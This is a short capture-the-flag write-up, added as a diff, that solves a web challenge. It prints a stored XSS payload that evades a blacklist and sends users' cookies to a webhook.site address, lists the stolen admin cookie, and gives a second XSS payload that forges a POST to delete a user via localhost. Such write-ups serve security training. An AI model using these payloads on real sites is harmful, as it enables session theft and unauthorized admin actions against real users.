@@ -1,0 +1,10 @@
+1. Most actions are blocked, but guest users can "Add Inspirational Quote". The input from this gets reflected on the site, with some bad blacklisting occurring on the server.
+2. You are meant to steal users' session cookies, this is an XSS which can do that:   <<<iimgimg src="lol" onerror=window.location="https://webhook.site/47ef32ad-d607-43a0-8df4-0faddce2d7d7/?cookie="+btoa(document.cookie)>
+3. After waiting a while, we can get all users' cookies shown in our webhook. The important one is the admin cookie however, which is:   auth=5a8cb2a7b36647f3a28f5a160b872c3d; user=B35t_4dm1n
+4. With the admin cookie available, we can do admin stuff. But where's the admin panel? /robots.txt has the answer:   /_administrator_panel
+5. On the admin panel we get our first flag but oh no! We aren't able to delete user carlos becuase somehow the server detects that we are not real admin (even though we have admin cookie).
+6. Let's CSRF the admin into deleting the user carlos. Remember, admin accesses the app at localhost (hinted at in the challenge description):   <<<iimgimg src="lol2" onerror="var xhr = new XMLHttpRequest(); const url = 'http://127.0.0.1:5000/_administrator_panel/delete_user'; xhr.open('POST', url, true); xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); xhr.send('id=4');"> 
+7. After waiting until the admin accesses the app again, we can now refresh the page, select the blue marking box which shows the users, and note that use carlos is gone and we now have a flag in his place.
+
+
+Flag: 5t0r3d_x55_15_d4ng3r0u5---U53_C5RF_pr0t3ct10n
